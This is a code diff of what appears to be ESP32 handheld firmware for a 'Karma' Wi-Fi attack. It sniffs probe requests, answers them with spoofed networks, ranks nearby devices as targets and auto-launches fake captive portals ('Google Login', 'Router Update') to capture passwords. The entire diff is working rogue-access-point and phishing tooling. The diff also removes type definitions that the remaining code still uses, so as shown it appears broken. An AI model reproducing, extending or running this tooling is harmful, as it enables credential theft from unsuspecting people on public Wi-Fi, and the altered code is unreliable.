@@ -50,56 +50,6 @@
 const uint8_t priorityChannels[] = {1, 6, 11, 3, 8};
 #define NUM_PRIORITY_CHANNELS 5
 
-// Attack tiers for different strategies
-enum AttackTier {
-    TIER_NONE = 0,
-    TIER_CLONE = 1,     // Clone popular networks (long duration)
-    TIER_HIGH = 2,      // High-value targets (medium duration)
-    TIER_MEDIUM = 3,    // Medium targets (short duration)
-    TIER_FAST = 4       // Fast cycling for demos (very short)
-};
-
-// Portal template structure
-struct PortalTemplate {
-    String name;
-    String filename;  // Empty for default templates
-    bool isDefault;
-    bool verifyPassword;
-};
-
-// Enhanced PendingPortal structure
-struct PendingPortal {
-    String ssid;
-    uint8_t channel;
-    String targetMAC;
-    unsigned long timestamp;
-    bool launched;
-    String templateName;
-    String templateFile;
-    bool isDefaultTemplate;
-    bool verifyPassword;
-    uint8_t priority;      // 0-100 priority score
-    AttackTier tier;       // Attack tier
-    uint16_t duration;     // Portal duration in ms
-    bool isCloneAttack;    // Is this a clone attack?
-    uint16_t probeCount;   // How many times this SSID was probed
-};
-
-// Attack configuration
-struct AttackConfig {
-    AttackTier defaultTier = TIER_HIGH;
-    uint32_t cloneDuration = 120000;    // 2 minutes for clone attacks
-    uint16_t highTierDuration = 45000;  // 45 seconds for high priority
-    uint16_t mediumTierDuration = 30000;// 30 seconds for medium
-    uint16_t fastTierDuration = 15000;  // 15 seconds for fast mode
-    uint8_t priorityThreshold = 60;     // Minimum priority to attack (0-100)
-    uint8_t cloneThreshold = 5;         // Minimum probes to trigger clone attack
-    uint8_t maxCloneNetworks = 2;       // Max clone networks to attack
-    bool enableCloneMode = true;        // Enable clone network detection
-    bool enableTieredAttack = true;     // Enable tiered attack strategy
-    bool prioritizeByRSSI = true;       // Prioritize by signal strength
-};
-
 //===== Run-Time variables =====//
 unsigned long last_time = 0;
 unsigned long last_ChannelChange = 0;
@@ -375,30 +325,24 @@ void analyzeClientBehavior(const ProbeRequest &probe) {
     }
 }
 
-// Calculate attack priority score (0-100)
 uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest &probe) {
     uint8_t score = 0;
 
-    // 1. Signal strength (RSSI) - 30 points max
-    if (probe.rssi > -50) score += 30;          // Excellent signal
-    else if (probe.rssi > -65) score += 20;     // Good signal
-    else if (probe.rssi > -75) score += 10;     // Fair signal
+    if (probe.rssi > -50) score += 30;
+    else if (probe.rssi > -65) score += 20;
+    else if (probe.rssi > -75) score += 10;
 
-    // 2. Probe frequency - 25 points max
-    if (client.probeCount > 10) score += 25;    // Very active
-    else if (client.probeCount > 5) score += 15;// Active
-    else if (client.probeCount > 2) score += 5; // Somewhat active
+    if (client.probeCount > 10) score += 25;
+    else if (client.probeCount > 5) score += 15;
+    else if (client.probeCount > 2) score += 5;
 
-    // 3. Vulnerability - 20 points max
-    if (client.isVulnerable) score += 20;       // Known vulnerable
+    if (client.isVulnerable) score += 20;
 
-    // 4. Recency - 15 points max
     unsigned long sinceLast = millis() - client.lastSeen;
-    if (sinceLast < 5000) score += 15;          // Very recent
-    else if (sinceLast < 15000) score += 10;    // Recent
-    else if (sinceLast < 30000) score += 5;     // Somewhat recent
+    if (sinceLast < 5000) score += 15;
+    else if (sinceLast < 15000) score += 10;
+    else if (sinceLast < 30000) score += 5;
 
-    // 5. SSID popularity - 10 points max
     String ssidLower = probe.ssid;
     ssidLower.toLowerCase();
     if (ssidLower.indexOf("starbucks") != -1 ||
@@ -407,13 +351,12 @@ uint8_t calculateAttackPriority(const ClientBehavior &client, const ProbeRequest
         ssidLower.indexOf("spectrum") != -1 ||
         ssidLower.indexOf("comcast") != -1 ||
         ssidLower.indexOf("tmobile") != -1) {
-        score += 10; // Common/public SSID
+        score += 10;
     }
 
     return min(score, (uint8_t)100);
 }
 
-// Determine attack tier based on priority score
 AttackTier determineAttackTier(uint8_t priority) {
     if (priority >= 80) return TIER_HIGH;
     if (priority >= 60) return TIER_MEDIUM;
@@ -421,7 +364,6 @@ AttackTier determineAttackTier(uint8_t priority) {
     return TIER_NONE;
 }
 
-// Get portal duration based on tier
 uint16_t getPortalDuration(AttackTier tier) {
     switch(tier) {
         case TIER_CLONE: return (uint16_t)attackConfig.cloneDuration;
@@ -570,15 +512,13 @@ uint8_t getBestChannel() {
     return best;
 }
 
-// Track SSID frequency for clone attacks
 void updateSSIDFrequency(const String &ssid) {
     if (ssid.isEmpty()) return;
 
     ssidFrequency[ssid]++;
 
-    // Update popular SSIDs list
     static unsigned long lastSort = 0;
-    if (millis() - lastSort > 5000) { // Sort every 5 seconds
+    if (millis() - lastSort > 5000) {
         lastSort = millis();
 
         popularSSIDs.clear();
@@ -586,17 +526,14 @@ void updateSSIDFrequency(const String &ssid) {
             popularSSIDs.push_back(pair);
         }
 
-        // Sort by frequency (descending)
         std::sort(popularSSIDs.begin(), popularSSIDs.end(),
             [](const auto &a, const auto &b) { return a.second > b.second; });
     }
 }
 
-// Check for clone attack opportunities
 void checkCloneAttackOpportunities() {
     if (!attackConfig.enableCloneMode || popularSSIDs.empty()) return;
 
-    // Check if we should reset frequency tracking
     if (millis() - lastFrequencyReset > SSID_FREQUENCY_RESET) {
         ssidFrequency.clear();
         popularSSIDs.clear();
@@ -604,13 +541,11 @@ void checkCloneAttackOpportunities() {
         return;
     }
 
-    // Check top SSIDs for clone attack
     size_t maxNetworks = std::min((size_t)attackConfig.maxCloneNetworks, popularSSIDs.size());
     for (size_t i = 0; i < maxNetworks; i++) {
         const auto &ssidPair = popularSSIDs[i];
 
         if (ssidPair.second >= attackConfig.cloneThreshold) {
-            // Check if we're already attacking this SSID
             bool alreadyAttacking = false;
             for (const auto &portal : pendingPortals) {
                 if (portal.ssid == ssidPair.first && portal.isCloneAttack) {
@@ -629,7 +564,7 @@ void checkCloneAttackOpportunities() {
                 portal.templateFile = selectedTemplate.filename;
                 portal.isDefaultTemplate = selectedTemplate.isDefault;
                 portal.verifyPassword = selectedTemplate.verifyPassword;
-                portal.priority = 100; // Max priority for clone attacks
+                portal.priority = 100;
                 portal.tier = TIER_CLONE;
                 portal.duration = (uint16_t)attackConfig.cloneDuration;
                 portal.isCloneAttack = true;
@@ -644,15 +579,12 @@ void checkCloneAttackOpportunities() {
     }
 }
 
-// Load portal templates from filesystem
 void loadPortalTemplates() {
     portalTemplates.clear();
 
-    // Add default templates
     portalTemplates.push_back({"Google Login", "", true, false});
     portalTemplates.push_back({"Router Update", "", true, true});
 
-    // Load custom templates from LittleFS
     if (LittleFS.begin()) {
         if (LittleFS.exists("/PortalTemplates")) {
             File root = LittleFS.open("/PortalTemplates");
@@ -667,7 +599,6 @@ void loadPortalTemplates() {
                     tmpl.isDefault = false;
                     tmpl.verifyPassword = false;
 
-                    // Check if template has verification hint in first line
                     String firstLine = file.readStringUntil('\n');
                     if (firstLine.indexOf("verify=\"true\"") != -1) {
                         tmpl.verifyPassword = true;
@@ -682,7 +613,6 @@ void loadPortalTemplates() {
         LittleFS.end();
     }
 
-    // Load custom templates from SD card
     if (SD.begin()) {
         if (SD.exists("/PortalTemplates")) {
             File root = SD.open("/PortalTemplates");
@@ -712,7 +642,6 @@ void loadPortalTemplates() {
     }
 }
 
-// Show template selection menu at startup
 bool selectPortalTemplate() {
     loadPortalTemplates();
 
@@ -760,42 +689,32 @@ bool selectPortalTemplate() {
     return templateSelected;
 }
 
-// Launch Evil Portal with timeout based on tier
 void launchTieredEvilPortal(PendingPortal &portal) {
     Serial.printf("[TIER-%d] Launching portal for %s (Duration: %ds)\n", 
                  portal.tier, portal.ssid.c_str(), portal.duration / 1000);
 
     isPortalActive = true;
 
-    // Clean shutdown WiFi
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_deinit();
     delay(500);
 
-    // Launch Evil Portal with autoMode=true to skip menu
     EvilPortal portalInstance(portal.ssid, portal.channel, 
                             karmaConfig.enableDeauth, portal.verifyPassword, true);
 
-    // Track portal start time
     unsigned long portalStart = millis();
     bool portalExited = false;
 
-    // Monitor portal with timeout
     while (millis() - portalStart < portal.duration) {
-        // Check for early exit
         if (check(EscPress)) {
             Serial.println("[PORTAL] Early exit requested");
             break;
         }
 
-        // Check if portal is still running (you'd need EvilPortal to expose status)
-        // For now, we'll just wait the duration
-
         delay(100);
     }
 
-    // Force exit if still running
     Serial.printf("[PORTAL] Timeout reached (%ds), restarting karma...\n", portal.duration / 1000);
 
     isPortalActive = false;
@@ -806,15 +725,12 @@ void launchTieredEvilPortal(PendingPortal &portal) {
         autoPortalsLaunched++;
     }
 
-    // Restart karma sniffer
     karma_setup();
 }
 
-// Check and launch pending portals with tiered strategy
 void executeTieredAttackStrategy() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive) return;
 
-    // Sort portals by priority (highest first)
     std::sort(pendingPortals.begin(), pendingPortals.end(),
         [](const PendingPortal &a, const PendingPortal &b) {
             if (a.isCloneAttack && !b.isCloneAttack) return true;
@@ -822,21 +738,18 @@ void executeTieredAttackStrategy() {
             return a.priority > b.priority;
         });
 
-    // Execute attack based on tier
     if (attackConfig.enableTieredAttack) {
-        // 1. Clone attacks first (highest priority)
         for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
             if (it->isCloneAttack && !it->launched) {
                 launchTieredEvilPortal(*it);
                 it->launched = true;
                 it = pendingPortals.erase(it);
-                return; // One attack at a time
+                return;
             } else {
                 ++it;
             }
         }
 
-        // 2. High tier individual attacks
         for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
             if (it->tier == TIER_HIGH && !it->launched) {
                 launchTieredEvilPortal(*it);
@@ -848,17 +761,15 @@ void executeTieredAttackStrategy() {
             }
         }
 
-        // 3. Medium tier (can batch multiple)
         std::vector<PendingPortal> mediumTargets;
         for (const auto &portal : pendingPortals) {
             if (portal.tier == TIER_MEDIUM && !portal.launched) {
                 mediumTargets.push_back(portal);
-                if (mediumTargets.size() >= 2) break; // Batch 2 medium targets
+                if (mediumTargets.size() >= 2) break;
             }
         }
 
         if (!mediumTargets.empty()) {
-            // Attack first medium target
             for (auto &target : mediumTargets) {
                 for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ++it) {
                     if (it->ssid == target.ssid && it->targetMAC == target.targetMAC) {
@@ -871,7 +782,6 @@ void executeTieredAttackStrategy() {
             }
         }
 
-        // 4. Fast tier (quick attacks, lower chance)
         for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
             if (it->tier == TIER_FAST && !it->launched) {
                 launchTieredEvilPortal(*it);
@@ -883,7 +793,6 @@ void executeTieredAttackStrategy() {
             }
         }
     } else {
-        // Simple FIFO strategy
         for (auto it = pendingPortals.begin(); it != pendingPortals.end(); ) {
             if (!it->launched) {
                 launchTieredEvilPortal(*it);
@@ -897,42 +806,35 @@ void executeTieredAttackStrategy() {
     }
 }
 
-// Check pending portals and execute attacks
 void checkPendingPortals() {
     if (pendingPortals.empty() || !templateSelected || isPortalActive) return;
 
-    // Remove old pending portals (> 5 minutes)
     unsigned long now = millis();
     pendingPortals.erase(
         std::remove_if(pendingPortals.begin(), pendingPortals.end(),
             [now](const PendingPortal &p) {
-                return (now - p.timestamp > 300000); // 5 minutes
+                return (now - p.timestamp > 300000);
             }),
         pendingPortals.end()
     );
 
-    // Execute tiered attack strategy
     executeTieredAttackStrategy();
 }
 
-// Launch Evil Portal for manual mode (shows menu)
 void launchManualEvilPortal(const String &ssid, uint8_t channel, bool verifyPwd) {
     Serial.printf("[MANUAL] Launching Evil Portal for %s (ch%d)\n", ssid.c_str(), channel);
 
     isPortalActive = true;
 
-    // Clean shutdown WiFi
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
     esp_wifi_deinit();
     delay(500);
 
-    // Launch Evil Portal with autoMode=false to show menu
     EvilPortal portalInstance(ssid, channel, karmaConfig.enableDeauth, verifyPwd, false);
 
     isPortalActive = false;
 
-    // After portal exits, restart karma sniffer
     Serial.println("[MANUAL] Portal closed, restarting karma...");
     karma_setup();
 }
@@ -976,16 +878,13 @@ void probe_sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
             if (it != clientBehaviors.end()) {
                 ClientBehavior &client = it->second;
 
-                // Calculate attack priority
                 uint8_t priority = calculateAttackPriority(client, probe);
 
-                // Only attack if above threshold and cooldown expired
                 if (priority >= attackConfig.priorityThreshold) {
-                    if (millis() - client.lastKarmaAttempt > 60000) { // 1 minute cooldown
+                    if (millis() - client.lastKarmaAttempt > 60000) {
                         sendProbeResponse(probe.ssid, probe.mac, probe.channel);
                         client.lastKarmaAttempt = millis();
 
-                        // Schedule portal based on priority
                         AttackTier tier = determineAttackTier(priority);
 
                         if (tier != TIER_NONE) {
@@ -1090,7 +989,6 @@ void updateKarmaDisplay() {
         tft.setTextSize(1);
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
 
-        // Left column
         tft.setCursor(10, tftHeight - 75);
         tft.print("Total: " + String(totalProbes));
 
@@ -1106,7 +1004,6 @@ void updateKarmaDisplay() {
         tft.setCursor(10, tftHeight - 35);
         tft.print("Clones: " + String(cloneAttacksLaunched));
 
-        // Right column
         tft.setCursor(tftWidth/2, tftHeight - 75);
         tft.print("Pending: " + String(pendingPortals.size()));
 
@@ -1138,7 +1035,6 @@ void updateKarmaDisplay() {
             tft.print(templateText);
         }
 
-        // Show active portal if any
         if (isPortalActive && !pendingPortals.empty()) {
             tft.fillRect(10, tftHeight - 95, tftWidth - 20, 10, bruceConfig.bgColor);
             tft.setCursor(10, tftHeight - 95);
@@ -1151,8 +1047,6 @@ void updateKarmaDisplay() {
     }
 }
 
-//===== SETUP =====//
-
 void safe_wifi_deinit() {
     esp_wifi_set_promiscuous(false);
     esp_wifi_stop();
@@ -1161,7 +1055,6 @@ void safe_wifi_deinit() {
 }
 
 void karma_setup() {
-    // Clean shutdown if previous WiFi was active
     if (esp_wifi_stop() == ESP_OK) { safe_wifi_deinit(); }
 
     delay(200);
@@ -1170,20 +1063,16 @@ void karma_setup() {
     int redraw = true;
     String FileSys = "LittleFS";
 
-    // STEP 1: Show template selection FIRST
     drawMainBorderWithTitle("KARMA ATTACK SETUP");
     displayTextLine("Select portal template:");
     delay(1000);
 
-    // Force template selection before starting
     if (!selectPortalTemplate()) {
-        // User skipped or no templates
         drawMainBorderWithTitle("KARMA SETUP");
         displayTextLine("Starting without portal...");
         delay(1000);
     }
 
-    // STEP 2: Continue with normal setup
     drawMainBorderWithTitle("ENHANCED KARMA ATK");
 
     if (setupSdCard()) {
@@ -1205,15 +1094,13 @@ void karma_setup() {
     initMACCache();
     clearProbes();
 
-    // Configure Karma based on template selection
     karmaConfig.enableAutoKarma = true;
     karmaConfig.enableDeauth = false;
     karmaConfig.enableSmartHop = true;
     karmaConfig.prioritizeVulnerable = true;
-    karmaConfig.enableAutoPortal = templateSelected; // Only auto-portal if template selected
+    karmaConfig.enableAutoPortal = templateSelected;
     karmaConfig.maxClients = MAX_CLIENT_TRACK;
 
-    // Configure attack strategy
     attackConfig.defaultTier = TIER_HIGH;
     attackConfig.enableCloneMode = true;
     attackConfig.enableTieredAttack = true;
@@ -1262,10 +1149,8 @@ void karma_setup() {
             lastDeauthTime = currentTime;
         }
 
-        // Check for clone attack opportunities
         checkCloneAttackOpportunities();
 
-        // Check and launch pending portals
         checkPendingPortals();
 
         if (check(NextPress)) {
@@ -1340,7 +1225,6 @@ void karma_setup() {
                              if (!client.probedSSIDs.empty()) {
                                  String itemText = client.mac.substring(9) + " (VULN)";
                                  karmaOptions.push_back({itemText.c_str(), [=]() {
-                                     // Manual portal launch with template settings
                                      launchManualEvilPortal(client.probedSSIDs[0], 
                                                            client.favoriteChannel, 
                                                            selectedTemplate.verifyPassword);
@@ -1351,7 +1235,6 @@ void karma_setup() {
                          for (const auto &probe : uniqueProbes) {
                              String itemText = probe.ssid + " (" + String(probe.rssi) + "|ch " + String(probe.channel) + ")";
                              karmaOptions.push_back({itemText.c_str(), [=]() {
-                                 // Manual portal launch
                                  launchManualEvilPortal(probe.ssid, probe.channel, 
                                                        selectedTemplate.verifyPassword);
                              }});
